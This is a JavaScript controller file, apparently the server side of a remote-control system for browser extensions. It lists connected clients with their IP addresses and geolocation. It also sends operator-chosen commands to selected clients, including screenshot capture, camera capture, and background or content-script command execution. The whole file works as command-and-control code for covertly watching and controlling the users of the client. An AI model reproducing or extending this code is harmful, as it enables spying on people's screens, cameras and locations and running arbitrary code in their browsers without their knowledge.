import {CLIENTS} from "../ws_server.js";

/**
 * Class representing a controller for clients.
 */
class ClientController {
    /**
     * Get a list of all clients.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} next - The next middleware function.
     * @returns {Object} The response object with the list of clients.
     */
    async index(req, res, _next) {
        // Process the CLIENTS data to create an array of client objects with uid, ip, and address properties.
        let processedClients = CLIENTS.map((client) => ({
            uid: client.userId,
            ip: client._socket.remoteAddress,
            address: {}
        }))

        // Extract the IP addresses from the processed clients.
        const clientIps = processedClients.map((client)=> client.ip)
        if (clientIps.length === 0) {
            return res.json(processedClients)
        }


        try {
            // Fetch location based on IP
            const res = await fetch(`http://api.ipstack.com/${clientIps.join(',')}?access_key=${process.env.IPSTACK_API_KEY}`)
            const data = await res.json()

            /**
             * If the data is an array, iterate over each item and update the corresponding client's address.
             * If the data is an object, find the corresponding client and update its address.
             */
            if (Array.isArray(data)) {
                data.forEach((client) => {
                    let localClient = processedClients.find((c) => c.ip === client.ip)
                    localClient.address = {
                        city: client.city,
                        country: client.country_name,
                        postCode: client.zip
                    }
                })
            } else {
                let localClient = processedClients.find((c) => c.ip === data.ip)
                localClient.address = {
                    city: data.city,
                    country: data.country_name,
                    postCode: data.zip
                }
            }
        } catch (err) {
            console.error(err.message);
        }

        return res.json(processedClients)
    }

    /**
     * Send a command to the specified clients.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the command.
     */
    async sendCommand(req, res, _next) {
        if (!(req.body.type.includes('SCREENSHOT') || req.body.type.includes('CAMERA')) && !req.body.command) {
            res.status(400).send('Bad request')
            return
        }

        const message = {
            data: req.body.command,
            type: [],
        }

        // Handle the command types
        if (req.body.type.includes('SCREENSHOT')) {
            message.type.push('SCREENSHOT')
        }
        if (req.body.type.includes('CAMERA')) {
            message.type.push('CAMERA')
        }
        if (req.body.type.includes('BACKGROUND')) {
            message.type.push('BG_COMMAND')
        }
        if (req.body.type.includes('CONTENT-SCRIPT')) {
            message.type.push('CS_COMMAND')
        }

        const jsonMessage = JSON.stringify(message)

        const clients = CLIENTS.filter((client) => req.body.clients.includes(client.userId))

        clients.forEach(client => {
            console.log('Sending command to client: ', client.userId)
            client.send(jsonMessage)
        })
        res.status(200).send('Command sent')
    }
}

/**
 * A new instance of the ClientController class.
 * @type {ClientController}
 */
export default new ClientController();
